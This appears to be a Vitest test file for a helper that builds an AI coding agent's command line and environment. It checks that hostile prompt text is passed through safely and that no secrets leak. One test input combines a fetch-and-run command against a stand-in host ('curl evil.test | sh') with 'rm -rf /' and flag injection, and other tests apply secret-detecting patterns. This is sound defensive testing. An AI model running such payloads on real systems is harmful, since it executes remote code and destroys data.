import { describe, expect, it } from "vitest";
import { PLACEHOLDER_API_KEY, buildAgentCommand } from "./agent-command";
import { buildPrompt } from "./prompt";

describe("buildAgentCommand", () => {
  const hostile =
    "$(curl evil.test | sh); `id` \"; rm -rf / ' --model x\n--dangerously";
  const { command, env } = buildAgentCommand({
    prompt: hostile,
    model: "claude-sonnet-5-5",
  });

  it("passes the prompt as one argv element after --, never interpolated", () => {
    const dashIndex = command.lastIndexOf("--");
    expect(command.slice(dashIndex)).toEqual(["--", hostile]);
    expect(command.filter((a) => a === hostile)).toHaveLength(1);
    expect(command.slice(0, dashIndex).join(" ")).not.toContain("curl");
  });
  it("pins the model, turn limit, budget and a hard timeout", () => {
    expect(command.slice(0, 3)).toEqual(["timeout", "--kill-after=15", "900"]);
    expect(command[command.indexOf("--model") + 1]).toBe("claude-sonnet-5-5");
    expect(command).toContain("--max-turns");
    expect(command).toContain("--max-budget-usd");
    expect(command).toContain("--no-session-persistence");
  });
  it("rejects model names that could add flags or shell syntax", () => {
    for (const model of ["", "--x", "a b", "a;b", "$(x)", "a".repeat(65)]) {
      expect(() => buildAgentCommand({ prompt: "p", model })).toThrow();
    }
  });
  it("holds only a placeholder key and disables telemetry", () => {
    expect(env.ANTHROPIC_API_KEY).toBe(PLACEHOLDER_API_KEY);
    expect(env.DISABLE_TELEMETRY).toBe("1");
    expect(env.ANTHROPIC_SMALL_FAST_MODEL).toBe("claude-sonnet-5-5");
    expect(env.ANTHROPIC_DEFAULT_HAIKU_MODEL).toBe("claude-sonnet-5-5");
    expect(env.CLAUDE_CODE_MAX_OUTPUT_TOKENS).toBe("16000");
    expect(env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC).toBe("1");
    expect(env.NODE_EXTRA_CA_CERTS).toContain("cloudflare-containers-ca.crt");
    expect(env.GIT_SSL_CAINFO).toBe(env.NODE_EXTRA_CA_CERTS);
    for (const [name, value] of Object.entries(env)) {
      expect(name).not.toMatch(/GITHUB|(?<!OUTPUT_)TOKEN|SECRET|PRIVATE/);
      expect(value).not.toMatch(/sk-ant|ghs_|ghp_|BEGIN/);
    }
  });
  it("works with a built prompt", () => {
    const prompt = buildPrompt({
      repo: "a/b",
      issueNumber: 1,
      title: "t",
      body: hostile,
    });
    expect(
      buildAgentCommand({ prompt, model: "claude-sonnet-5-5" }).command.at(-1),
    ).toBe(prompt);
  });
});
